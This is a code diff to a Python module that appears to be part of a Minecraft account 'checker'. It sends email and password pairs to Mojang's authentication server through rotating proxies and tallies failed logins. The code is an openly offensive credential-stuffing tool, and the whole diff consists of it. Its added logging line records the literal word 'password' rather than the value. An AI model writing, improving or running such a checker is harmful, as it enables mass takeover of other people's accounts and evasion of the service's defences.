@@ -1,16 +1,17 @@
 from __main__ import checker
 from modules.functions import set_proxy,log,save
 from requests import get,post
+from json import dumps
 
 def check(email:str,password:str):
     retries = 0
     while retries != checker.retries:
         proxy = set_proxy()
-        body = {'agent': {'name': 'Minecraft','version': 1},'username': email,'password': password,'clientToken': "fff"}
+        body = dumps({'agent': {'name': 'Minecraft','version': 1},'username': email,'password': password,'clientToken': "fff"})
         header_1 = {"Content-Type": "application/json", 'Pragma': 'no-cache'}
         header_2 = {'Pragma': 'no-cache', "Authorization": f""}
         try:
-            r = post(url="https://authserver.mojang.com/authenticate",headers=header_1,json=body,timeout=checker.timeout,proxies=set_proxy(proxy))
+            r = post(url="https://authserver.mojang.com/authenticate",headers=header_1,data=body,timeout=checker.timeout,proxies=set_proxy(proxy))
             if 'Invalid credentials' in r.text:
                 retries += 1
             elif "[]" in r.text:
@@ -42,6 +43,8 @@ def check(email:str,password:str):
                 raise
         except:
             checker.errors += 1
+    if not checker.cui:
+        log("bad",email+":"+"password","Minecraft")
     checker.bad += 1 
     checker.cpm += 1
     return
